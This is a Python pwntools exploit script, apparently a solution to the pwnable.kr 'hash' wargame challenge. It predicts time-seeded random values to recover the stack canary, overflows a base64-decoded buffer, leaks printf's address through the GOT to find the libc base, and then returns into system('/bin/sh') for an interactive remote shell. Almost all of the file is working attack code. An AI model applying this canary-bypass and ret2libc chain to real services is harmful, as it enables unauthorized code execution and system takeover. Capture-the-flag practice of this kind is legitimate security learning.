from pwn import *
from time import time
from ctypes import *
from base64 import b64decode,b64encode

#sh = process("./hash") 
sh = remote("pwnable.kr",9002)
rand = CDLL("./rand.so")
e = ELF("./hash")
#libc = ELF("/lib/i386-linux-gnu/libc.so.6") 
libc = ELF("./bf_libc.so")
# get random do chenh lech ve thoi gian t ~ 1 nen phai check 2 lan
t = int(time())
t = rand.setSrand(t)
log.success("time(0) = " + str(t))
v = []
for i in range(8) :
    v.append(rand.rand())

# leak canary 
print sh.recvuntil('re you human? input captcha : ')
myhash = sh.recvuntil("\n").strip()
canary = int(myhash) - v[1] - v[2] + v[3] - v[4] - v[5] + v[6] - v[7]
canary = canary & 0xffffffff  
          
if canary % 2**8 != 0 :  
    t = t - 1 
    t = rand.setSrand(t)
    log.success("time(0) = " + str(t))
    v = []
    for i in range(8) : 
        v.append(rand.rand())
    canary = int(myhash) - v[1] - v[2] + v[3] - v[4] - v[5] + v[6] - v[7]
    canary = canary & 0xffffffff
    
log.success("canary = " + str(hex(canary)))
    
# overflow to return main  
main = p32(0x0804908F) 
ret = p32(0x080487eb) 

payload = "1" * 0x200 + p32(canary) + "aaaa" * 3 + ret +  p32(e.plt['printf']) + main + p32(e.got['printf'])
sh.sendline(myhash)

print sh.recvuntil("Encode your data with BASE64 then paste me!")
sh.sendline(b64encode(payload))
print sh.recvline()
print sh.recvline()
printf = u32(sh.recv(4))
libc.address = printf - libc.sym['printf']
log.success("printf addr = " + hex(printf))
log.success("libc addr = " + hex(libc.address))

sh.recvuntil("Are you human? input captcha : ")
myhash2 = sh.recvuntil("\n").strip()
sh.sendline(myhash2)

# return to system 
system = p32(libc.sym['system'])
binsh = p32(next(libc.search('/bin/sh\0')))
payload2 = "1" * 0x200 + p32(canary) + "aaaa" * 3 + ret + system + main + binsh
sh.sendline(b64encode(payload2))
sh.interactive()